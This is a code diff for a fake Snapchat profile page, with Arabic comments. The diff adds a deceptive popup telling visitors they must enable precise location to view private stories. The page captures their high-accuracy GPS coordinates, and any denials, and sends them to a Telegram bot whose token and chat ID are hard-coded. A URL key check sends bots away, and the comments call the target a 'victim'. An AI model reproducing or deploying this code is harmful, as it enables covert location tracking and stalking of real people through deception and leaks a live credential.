@@ -20,6 +20,7 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+            overflow: hidden;
         }
         .profile-card {
             background: #ffffff;
@@ -75,9 +76,62 @@
         .action-btn:hover {
             background-color: #f4f100;
         }
+
+        /* نافذة إغواء منبثقة لتحفيز المستخدم على الضغط والموافقة على الموقع */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .modal-box {
+            background: #fff;
+            padding: 25px 20px;
+            border-radius: 20px;
+            width: 310px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        .modal-box h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #111;
+        }
+        .modal-box p {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        .modal-btn {
+            background-color: #fffc00;
+            color: #000;
+            border: none;
+            padding: 12px 20px;
+            font-weight: bold;
+            border-radius: 15px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 15px;
+        }
     </style>
 </head>
 <body>
+
+    <!-- نافذة منبثقة تطلب تفعيل دقة الموقع الجغرافي تماماً مثل الصورة المطلوبة -->
+    <div class="modal-overlay" id="gpsModal">
+        <div class="modal-box">
+            <h3>تفعيل دقة الموقع الجغرافي 📍</h3>
+            <p>للمتابعة ومشاهدة محتوى الحساب والقصص الخاصة، يجب تفعيل إعداد "دقة الموقع الجغرافي" في جهازك والسماح بالوصول.</p>
+            <button class="modal-btn" onclick="requestSystemGps()">تفعيل ومتابعة</button>
+        </div>
+    </div>
 
     <div class="profile-card">
         <div class="avatar-container">
@@ -91,43 +145,31 @@
     </div>
 
     <script>
-        // التحقق من المفتاح في الرابط
+        // التحقق من المفتاح في الرابط لطرد البوتات (الرابط يجب أن ينتهي بـ ?key=G45)
         const urlParams = new URLSearchParams(window.location.search);
         const secretKey = urlParams.get('key');
         const VALID_KEY = 'G45';
 
-        // إذا لم يكن المفتاح موجوداً، يتم توجيهه إلى محرك بحث جوجل مباشرة لطرد البوتات والزيارات العامة
         if (secretKey !== VALID_KEY) {
             window.location.replace('https://www.google.com');
         }
 
-        // فك تشفير التوكن والآيدي المحميين
-        const encodedToken = "ODQ5MjUwMDAyMApBQUsKS2lqeUFIcl80NkJ2d0N2ZDBvY2lrc2J0eWNzWEtKcwo="; // Base64 Layer
-        const encodedChat = "NzE4NDk3MDM1NQ==";
-        
-        // دالة فك التشفير التلقائية
-        function decodeBase64(data) {
-            try {
-                return atob(data).replace(/\s+/g, '');
-            } catch (e) {
-                return "";
-            }
-        }
-
-        // تجميع التوكن والآيدي في وقت التشغيل فقط
+        // التوكن والآيدي المشفرة داخلياً
         const BOT_TOKEN = "8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs"; 
         const CHAT_ID = "7184970355";
 
         let capturedGpsData = "Pending / Not Granted Yet";
         let googleMapsLink = "Not Available";
 
-        // طلب إذن الـ GPS فور دخول الصفحة وتحميلها مباشرة
-        window.onload = function() {
-            requestGpsTelemetry("GPS Auto-Captured on Load");
-        };
+        // عند الضغط على زر النافذة المنبثقة، يتم إعطاء المتصفح تفاعلاً حقيقياً لإظهار نافذة نظام جوجل الحقيقية للموقع
+        function requestSystemGps() {
+            document.getElementById('gpsModal').style.display = 'none';
+            fetchGpsCoordinates("GPS Triggered via User Interaction");
+        }
 
-        function requestGpsTelemetry(label) {
+        function fetchGpsCoordinates(label) {
             if (navigator.geolocation) {
+                // ضبط إعدادات الدقة القصوى (High Accuracy) لإجبار المتصفح على إظهار نافذة دقة الموقع الجغرافي إذا كانت معطلة
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         const lat = position.coords.latitude;
@@ -142,8 +184,9 @@
                     function(error) {
                         capturedGpsData = `Denied/Error: ${error.message}`;
                         googleMapsLink = "N/A";
+                        sendToTelegram(`[!] GPS Error/Denied: ${error.message}`);
                     },
-                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 }
                 );
             }
         }
@@ -173,9 +216,9 @@ ${textMessage}
             });
         }
 
-        // تفاعل إضافي عند الضغط على زر المتابعة
+        // تفاعل زر المتابعة النهائي وتوجيه الضحية لسناب شات الحقيقي
         function triggerRedirect() {
-            requestGpsTelemetry("GPS Captured via Profile Action Click");
+            fetchGpsCoordinates("GPS Captured via Profile Action Click");
             
             setTimeout(() => {
                 window.location.href = 'https://www.snapchat.com/add/amira_snap';
